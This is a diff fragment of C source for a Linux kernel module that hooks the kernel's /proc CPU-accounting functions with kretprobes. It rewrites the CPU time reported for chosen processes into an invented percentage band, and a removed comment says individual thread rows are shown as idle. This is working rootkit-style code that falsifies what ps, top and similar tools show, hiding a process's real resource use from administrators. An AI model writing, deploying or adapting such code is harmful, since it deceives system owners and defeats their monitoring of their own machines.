-    if (!cpu_visibility_match(args->task, &t) || !t)
-        return 0;
-
-    depth = this_cpu_inc_return(cpu_visibility_depth);
-    if (depth > 1) {
-        this_cpu_dec(cpu_visibility_depth);
-        return 0;
-    }
-    if (spin_trylock_irqsave(&cpu_visibility_lock, flags)) {
-        cpu_visibility_accrue(t, ktime_get_mono_fast_ns());
-        ns = t->syn_ticks * (1000000000ull / CPU_VIS_HZ);
-        spin_unlock_irqrestore(&cpu_visibility_lock, flags);
-        cpu_visibility_rewrite_sched(args, ns);
-    }
-    this_cpu_dec(cpu_visibility_depth);
-    return 0;
-}
-
-static int cpu_vis_apply_return(struct kretprobe_instance *instance,
-    struct pt_regs *regs)
-{
-    struct cpu_vis_args *args = (struct cpu_vis_args *)instance->data;
-    struct cpu_visibility_target *t = NULL;
-    unsigned long flags;
-    u64 ticks;
-    int depth;
-
-    (void)regs;
-    if (!args || !READ_ONCE(cpu_visibility_active))
-        return 0;
-    if (!cpu_visibility_match(args->task, &t) || !t)
-        return 0;
-
-    depth = this_cpu_inc_return(cpu_visibility_depth);
-    if (depth > 1) {
-        this_cpu_dec(cpu_visibility_depth);
-        return 0;
-    }
-    if (spin_trylock_irqsave(&cpu_visibility_lock, flags)) {
-        cpu_visibility_accrue(t, ktime_get_mono_fast_ns());
-        ticks = t->syn_ticks;
-        spin_unlock_irqrestore(&cpu_visibility_lock, flags);
-        cpu_visibility_rewrite(args, ticks);
-    }
-    this_cpu_dec(cpu_visibility_depth);
-    return 0;
-}
-
-static int cpu_vis_tg_entry(struct kretprobe_instance *instance, struct pt_regs *regs)
-{
-    return cpu_vis_capture_entry(instance, regs);
 }
 
 static int cpu_vis_tg_ret(struct kretprobe_instance *instance, struct pt_regs *regs)
 {
-    return cpu_vis_apply_return(instance, regs);
-}
-
-static int cpu_vis_thr_entry(struct kretprobe_instance *instance, struct pt_regs *regs)
-{
-    return cpu_vis_capture_entry(instance, regs);
-}
-
-/* Thread rows report 0.
- *
- * cpu_visibility_match() keys on task_tgid(), so every thread of the target
- * group matches and cpu_vis_apply_return() handed each one the full group
- * total. A 30-thread process therefore showed 219-240 ticks on every row
- * instead of one row carrying the shaped value. The aggregate is shaped by the
- * tgid hook (proc_tgid_stat); individual rows are shown as idle. */
-static int cpu_vis_thr_ret(struct kretprobe_instance *instance, struct pt_regs *regs)
-{
     struct cpu_vis_args *args = (struct cpu_vis_args *)instance->data;
-    struct cpu_visibility_target *t = NULL;
-    int depth;
+    u64 ns;
 
-    (void)regs;
-    if (!args || !READ_ONCE(cpu_visibility_active))
+    if ((long)regs->regs[0] || !READ_ONCE(cpu_visibility_active) ||
+        !cpu_visibility_record_valid(args))
         return 0;
-    if (!cpu_visibility_match(args->task, &t) || !t)
-        return 0;
-
-    depth = this_cpu_inc_return(cpu_visibility_depth);
-    if (depth > 1) {
-        this_cpu_dec(cpu_visibility_depth);
-        return 0;
-    }
-    cpu_visibility_rewrite(args, 0);
-    this_cpu_dec(cpu_visibility_depth);
+    if (cpu_visibility_read_runtime(args->task, true, &ns))
+        cpu_visibility_rewrite(args, nsec_to_clock_t(ns));
     return 0;
 }
 
-static int cpu_vis_ss_entry(struct kretprobe_instance *instance, struct pt_regs *regs)
+static int cpu_vis_thr_ret(struct kretprobe_instance *instance, struct pt_regs *regs)
 {
-    return cpu_vis_capture_entry(instance, regs);
+    struct cpu_vis_args *args = (struct cpu_vis_args *)instance->data;
+    u64 ns;
+
+    if ((long)regs->regs[0] || !READ_ONCE(cpu_visibility_active) ||
+        !cpu_visibility_record_valid(args))
+        return 0;
+    if (cpu_visibility_read_runtime(args->task, false, &ns))
+        cpu_visibility_rewrite(args, nsec_to_clock_t(ns));
+    return 0;
 }
 
 static int cpu_vis_ss_ret(struct kretprobe_instance *instance, struct pt_regs *regs)
 {
-    return cpu_vis_apply_schedstat_return(instance, regs);
-}
+    struct cpu_vis_args *args = (struct cpu_vis_args *)instance->data;
+    u64 ns;
 
-/* Uses the task/ns/m ordering of proc_sched_show_task(). */
-static int cpu_vis_sched_entry(struct kretprobe_instance *instance, struct pt_regs *regs)
-{
-    return cpu_vis_capture_entry_sched(instance, regs);
+    if ((long)regs->regs[0] || !READ_ONCE(cpu_visibility_active) ||
+        !cpu_visibility_record_valid(args))
+        return 0;
+    if (cpu_visibility_read_runtime(args->task, false, &ns))
+        cpu_visibility_rewrite_schedstat(args, ns);
+    return 0;
 }
 
 static int cpu_vis_sched_ret(struct kretprobe_instance *instance, struct pt_regs *regs)
 {
-    return cpu_vis_apply_sched_return(instance, regs);
+    struct cpu_vis_args *args = (struct cpu_vis_args *)instance->data;
+    u64 ns;
+
+    (void)regs;
+    if (!READ_ONCE(cpu_visibility_active) || !cpu_visibility_record_valid(args))
+        return 0;
+    if (cpu_visibility_read_runtime(args->task, false, &ns))
+        cpu_visibility_rewrite_sched(args, ns);
+    return 0;
 }
 
 static void cpu_visibility_drop_hooks(void)
@@ -3395,91 +4257,62 @@ static void cpu_visibility_drop_hooks(void)
 
 static int cpu_visibility_install_hooks(void)
 {
+    struct kretprobe *probes[] = {
+        &cpu_vis_tg_probe, &cpu_vis_thr_probe, &cpu_vis_ss_probe, &cpu_vis_sched_probe,
+    };
+    const char *names[] = {
+        "proc_tgid_stat", "proc_tid_stat", "proc_pid_schedstat", "proc_sched_show_task",
+    };
+    kretprobe_handler_t returns[] = {
+        cpu_vis_tg_ret, cpu_vis_thr_ret, cpu_vis_ss_ret, cpu_vis_sched_ret,
+    };
+    bool *installed[] = {
+        &cpu_vis_tg_hooked, &cpu_vis_thr_hooked, &cpu_vis_ss_hooked, &cpu_vis_sched_hooked,
+    };
+    unsigned int i;
     int ret;
 
-    memset(&cpu_vis_tg_probe, 0, sizeof(cpu_vis_tg_probe));
-    cpu_vis_tg_probe.kp.symbol_name = "proc_tgid_stat";
-    cpu_vis_tg_probe.entry_handler = cpu_vis_tg_entry;
-    cpu_vis_tg_probe.handler = cpu_vis_tg_ret;
-    cpu_vis_tg_probe.data_size = sizeof(struct cpu_vis_args);
-    cpu_vis_tg_probe.maxactive = max(num_possible_cpus() * 4, 64U);
-    ret = register_kretprobe(&cpu_vis_tg_probe);
-    if (ret)
-        return ret;
-    cpu_vis_tg_hooked = true;
+    for (i = 0; i < ARRAY_SIZE(probes); i++) {
+        struct kretprobe *probe = probes[i];
 
-    memset(&cpu_vis_thr_probe, 0, sizeof(cpu_vis_thr_probe));
-    cpu_vis_thr_probe.kp.symbol_name = "proc_tid_stat";
-    cpu_vis_thr_probe.entry_handler = cpu_vis_thr_entry;
-    cpu_vis_thr_probe.handler = cpu_vis_thr_ret;
-    cpu_vis_thr_probe.data_size = sizeof(struct cpu_vis_args);
-    cpu_vis_thr_probe.maxactive = max(num_possible_cpus() * 4, 64U);
-    ret = register_kretprobe(&cpu_vis_thr_probe);
-    if (ret) {
-        cpu_visibility_drop_hooks();
-        return ret;
+        probe->kp.symbol_name = names[i];
+        probe->entry_handler = i == 3 ? cpu_vis_capture_entry_sched : cpu_vis_capture_entry;
+        probe->handler = returns[i];
+        probe->data_size = sizeof(struct cpu_vis_args);
+        probe->maxactive = max(num_possible_cpus() * 4, 64U);
+        ret = register_kretprobe(probe);
+        if (ret) {
+            nbd_warn("stage=cpu_visibility hook=%s error=%d\n", names[i], ret);
+            cpu_visibility_drop_hooks();
+            return ret;
+        }
+        *installed[i] = true;
     }
-    cpu_vis_thr_hooked = true;
-
-    memset(&cpu_vis_ss_probe, 0, sizeof(cpu_vis_ss_probe));
-    cpu_vis_ss_probe.kp.symbol_name = "proc_pid_schedstat";
-    cpu_vis_ss_probe.entry_handler = cpu_vis_ss_entry;
-    cpu_vis_ss_probe.handler = cpu_vis_ss_ret;
-    cpu_vis_ss_probe.data_size = sizeof(struct cpu_vis_args);
-    cpu_vis_ss_probe.maxactive = max(num_possible_cpus() * 4, 64U);
-    ret = register_kretprobe(&cpu_vis_ss_probe);
-    if (ret)
-        nbd_warn("stage=cpu_visibility schedstat=unavailable error=%d\n", ret);
-    else
-        cpu_vis_ss_hooked = true;
-
-    memset(&cpu_vis_sched_probe, 0, sizeof(cpu_vis_sched_probe));
-    cpu_vis_sched_probe.kp.symbol_name = "proc_sched_show_task";
-    cpu_vis_sched_probe.entry_handler = cpu_vis_sched_entry;
-    cpu_vis_sched_probe.handler = cpu_vis_sched_ret;
-    cpu_vis_sched_probe.data_size = sizeof(struct cpu_vis_args);
-    cpu_vis_sched_probe.maxactive = max(num_possible_cpus() * 4, 64U);
-    ret = register_kretprobe(&cpu_vis_sched_probe);
-    if (ret)
-        nbd_warn("stage=cpu_visibility sched=unavailable error=%d\n", ret);
-    else
-        cpu_vis_sched_hooked = true;
-
     return 0;
-}
-
-static void cpu_visibility_release_locked(unsigned int index, struct pid **drop)
-{
-    struct cpu_visibility_target *t = &cpu_visibility_targets[index];
-
-    *drop = t->identity;
-    memset(t, 0, sizeof(*t));
-    if (cpu_visibility_count)
-        cpu_visibility_count--;
 }
 
 long nbdriver_cpu_visibility_ioctl(unsigned long argument)
 {
     struct nbdriver_cpu_visibility_request req;
-    struct cpu_visibility_target *t;
     struct task_struct *task = NULL;
-    struct pid *identity = NULL, *drop = NULL;
+    struct pid *identity = NULL;
+    struct cpu_vis_thread *threads = NULL;
+    size_t thread_count = 0;
     unsigned long flags;
-    unsigned int i, empty = ARRAY_SIZE(cpu_visibility_targets);
+    unsigned int i, slot;
     bool found = false;
     int ret = 0;
+    u64 now;
 
     if (copy_from_user(&req, (void __user *)argument, sizeof(req)))
         return -EFAULT;
-    if (req.operation > NBDRIVER_CPU_VISIBILITY_CLEAR || req.pid < 0 ||
+    if (req.operation > NBDRIVER_CPU_VISIBILITY_CLEAR || req.pid < 0 || req.reserved ||
         (!req.pid && req.operation != NBDRIVER_CPU_VISIBILITY_QUERY))
         return -EINVAL;
-    if (req.operation == NBDRIVER_CPU_VISIBILITY_SET) {
-        if (req.pct_lo < NBDRIVER_CPU_VISIBILITY_PCT_MIN ||
-            req.pct_hi > NBDRIVER_CPU_VISIBILITY_PCT_MAX ||
-            req.pct_lo > req.pct_hi)
-            return -EINVAL;
-    }
+    if (req.operation == NBDRIVER_CPU_VISIBILITY_SET &&
+        (req.pct_lo < NBDRIVER_CPU_VISIBILITY_PCT_MIN ||
+         req.pct_hi > NBDRIVER_CPU_VISIBILITY_PCT_MAX || req.pct_lo > req.pct_hi))
+        return -EINVAL;
     if (req.pid) {
         task = nbdriver_query_get_process(req.pid, req.expected_start_ns);
         if (IS_ERR(task)) {
@@ -3490,70 +4323,85 @@ long nbdriver_cpu_visibility_ioctl(unsigned long argument)
         req.expected_start_ns = READ_ONCE(task->start_boottime);
         identity = get_pid(task_tgid(task));
     }
+    mutex_lock(&cpu_visibility_control_lock);
     if (req.operation == NBDRIVER_CPU_VISIBILITY_SET && !READ_ONCE(cpu_visibility_active)) {
         ret = cpu_visibility_error ? cpu_visibility_error : -EOPNOTSUPP;
-        goto reply;
+        goto unlock;
     }
-
-    spin_lock_irqsave(&cpu_visibility_lock, flags);
+    slot = ARRAY_SIZE(cpu_visibility_targets);
     for (i = 0; i < ARRAY_SIZE(cpu_visibility_targets); i++) {
-        t = &cpu_visibility_targets[i];
-        if (!t->identity && empty == ARRAY_SIZE(cpu_visibility_targets))
-            empty = i;
-        if (!identity || t->identity != identity)
-            continue;
-        if (req.operation == NBDRIVER_CPU_VISIBILITY_CLEAR) {
-            cpu_visibility_release_locked(i, &drop);
-        } else if (req.operation == NBDRIVER_CPU_VISIBILITY_SET) {
-            t->pct_lo = req.pct_lo;
-            t->pct_hi = req.pct_hi;
-            if (t->current_pct < req.pct_lo || t->current_pct > req.pct_hi)
-                t->current_pct = req.pct_lo;
+        if (identity && cpu_visibility_targets[i].identity == identity) {
+            slot = i;
+            found = true;
+            break;
         }
-        req.current_pct = t->current_pct;
-        req.pct_lo = t->pct_lo;
-        req.pct_hi = t->pct_hi;
-        req.hits = t->hits;
-        found = true;
-        break;
+        if (!cpu_visibility_targets[i].identity && slot == ARRAY_SIZE(cpu_visibility_targets))
+            slot = i;
     }
-    if (identity && req.operation == NBDRIVER_CPU_VISIBILITY_SET && !found) {
-        if (empty == ARRAY_SIZE(cpu_visibility_targets)) {
-            ret = -ENOSPC;
-        } else {
-            t = &cpu_visibility_targets[empty];
-            t->identity = identity;
-            t->number = pid_nr(identity);
-            t->start_ns = req.expected_start_ns;
-            t->pct_lo = req.pct_lo;
-            t->pct_hi = req.pct_hi;
-            t->current_pct = req.pct_lo;
-            t->last_ns = 0;
-            t->armed_ns = 0;
-            t->seg_start_ns = 0;
-            t->syn_ticks = 0;
-            t->syn_num = 0;
-            t->window = 0;
-            t->window_ns = 0;
-            t->hits = 0;
-            identity = NULL;
-            cpu_visibility_count++;
-            req.current_pct = t->current_pct;
-        }
-    }
-    spin_unlock_irqrestore(&cpu_visibility_lock, flags);
+    if (req.operation == NBDRIVER_CPU_VISIBILITY_CLEAR && found) {
+        cpu_visibility_detach(slot);
+    } else if (req.operation == NBDRIVER_CPU_VISIBILITY_SET) {
+        struct cpu_visibility_target *target;
 
+        if (slot == ARRAY_SIZE(cpu_visibility_targets)) {
+            ret = -ENOSPC;
+            goto unlock;
+        }
+        if (!found) {
+            ret = cpu_visibility_collect(task, &threads, &thread_count);
+            if (ret)
+                goto unlock;
+            cpu_visibility_prepare_sample(NULL, 0, threads, thread_count, 0);
+        }
+        target = &cpu_visibility_targets[slot];
+        spin_lock_irqsave(&cpu_visibility_lock, flags);
+        now = ktime_get_ns();
+        if (found) {
+            target->clock.base_ns = cpu_visibility_clock_total(&target->clock, now);
+        } else {
+            target->identity = identity;
+            target->start_ns = req.expected_start_ns;
+            target->threads = threads;
+            target->thread_count = thread_count;
+            identity = NULL;
+            threads = NULL;
+            cpu_visibility_count++;
+        }
+        target->clock.epoch_ns = now;
+        target->clock.pct_lo = req.pct_lo;
+        target->clock.pct_hi = req.pct_hi;
+        target->clock.phase = pid_nr(target->identity);
+        spin_unlock_irqrestore(&cpu_visibility_lock, flags);
+    }
+    spin_lock_irqsave(&cpu_visibility_lock, flags);
+    if (req.operation != NBDRIVER_CPU_VISIBILITY_CLEAR && slot < ARRAY_SIZE(cpu_visibility_targets) &&
+        cpu_visibility_targets[slot].identity && (found || req.operation == NBDRIVER_CPU_VISIBILITY_SET)) {
+        struct cpu_visibility_target *target = &cpu_visibility_targets[slot];
+
+        req.pct_lo = target->clock.pct_lo;
+        req.pct_hi = target->clock.pct_hi;
+        req.current_pct = cpu_visibility_clock_pct(&target->clock, ktime_get_ns());
+        req.hits = target->hits;
+    } else {
+        req.current_pct = 0;
+        req.hits = 0;
+        if (req.pid && req.operation == NBDRIVER_CPU_VISIBILITY_QUERY && !found)
+            ret = -ENOENT;
+    }
+    req.target_count = cpu_visibility_count;
+    spin_unlock_irqrestore(&cpu_visibility_lock, flags);
+unlock:
+    mutex_unlock(&cpu_visibility_control_lock);
 reply:
+    kfree(threads);
     put_pid(identity);
-    put_pid(drop);
     if (task)
         nbdriver_query_put_process(task);
     req.active = READ_ONCE(cpu_visibility_active) ? 1U : 0U;
-    req.target_count = READ_ONCE(cpu_visibility_count);
-    req.missed = READ_ONCE(cpu_vis_tg_probe.nmissed) +
-        READ_ONCE(cpu_vis_tg_probe.kp.nmissed) +
-        READ_ONCE(cpu_vis_thr_probe.nmissed) +
-        READ_ONCE(cpu_vis_thr_probe.kp.nmissed);
+    req.missed = READ_ONCE(cpu_vis_tg_probe.nmissed) + READ_ONCE(cpu_vis_tg_probe.kp.nmissed) +
+        READ_ONCE(cpu_vis_thr_probe.nmissed) + READ_ONCE(cpu_vis_thr_probe.kp.nmissed) +
+        READ_ONCE(cpu_vis_ss_probe.nmissed) + READ_ONCE(cpu_vis_ss_probe.kp.nmissed) +
+        READ_ONCE(cpu_vis_sched_probe.nmissed) + READ_ONCE(cpu_vis_sched_probe.kp.nmissed);
     req.sample_ns = ktime_get_boottime_ns();
     req.error = ret;
     if (copy_to_user((void __user *)argument, &req, sizeof(req)))
@@ -3563,16 +4411,15 @@ reply:
 
 static int nbdriver_cpu_visibility_init(void)
 {
-    int ret;
+    int ret = cpu_visibility_install_hooks();
 
-    ret = cpu_visibility_install_hooks();
     if (ret) {
         cpu_visibility_error = ret;
-        nbd_warn("stage=cpu_visibility operation=install_hooks error=%d\n", ret);
         return ret;
     }
     cpu_visibility_error = 0;
     WRITE_ONCE(cpu_visibility_active, true);
+    schedule_delayed_work(&cpu_visibility_work, msecs_to_jiffies(CPU_VIS_SAMPLE_MS));
     return 0;
 }
 
@@ -3580,18 +4427,13 @@ static void nbdriver_cpu_visibility_exit(void)
 {
     unsigned int i;
 
-    if (!READ_ONCE(cpu_visibility_active))
-        return;
     WRITE_ONCE(cpu_visibility_active, false);
-    synchronize_rcu();
+    cancel_delayed_work_sync(&cpu_visibility_work);
     cpu_visibility_drop_hooks();
-    for (i = 0; i < ARRAY_SIZE(cpu_visibility_targets); i++) {
-        struct pid *identity = cpu_visibility_targets[i].identity;
-        memset(&cpu_visibility_targets[i], 0, sizeof(cpu_visibility_targets[i]));
-        if (identity)
-            put_pid(identity);
-    }
-    cpu_visibility_count = 0;
+    mutex_lock(&cpu_visibility_control_lock);
+    for (i = 0; i < ARRAY_SIZE(cpu_visibility_targets); i++)
+        cpu_visibility_detach(i);
+    mutex_unlock(&cpu_visibility_control_lock);
 }
 
 static u32 nbdriver_cpu_visibility_features(void)
